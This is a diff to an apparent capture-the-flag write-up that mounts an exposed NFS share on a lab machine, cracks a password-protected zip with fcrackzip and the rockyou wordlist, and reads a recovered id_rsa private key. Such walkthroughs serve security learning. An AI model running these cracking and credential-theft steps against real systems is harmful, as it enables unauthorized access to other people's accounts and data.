@@ -131,11 +131,26 @@ showmount -e 192.168.38.140
 mkdir /mnt/dev
 mount -t nfs 192.168.38.140:/srv/nfs /mnt/dev
 cd /mmnt/dev
+ls
 unzip save.zip
 ```
 
 
 <img width="716" height="268" alt="image" src="https://github.com/user-attachments/assets/5e1114b0-c9a6-4374-a845-455694758c09" />
 
-  
+
+  Now the .zip file is password protected so we will try crack it.
+
+  ```bash
+fcrackzip -u -D -v -p /usr/share/wordlists/rockyou.txt save.zip
+unzip save.zip
+ls
+cat todo.txt
+cat id_rsa
+```  
+
+<img width="1201" height="230" alt="image" src="https://github.com/user-attachments/assets/ca3c9e27-71e4-4e34-b3fc-0c687b5551c2" />
+<img width="969" height="875" alt="image" src="https://github.com/user-attachments/assets/89414c4b-1673-46a1-bbdf-ed764d99bd4f" />
+
+
 
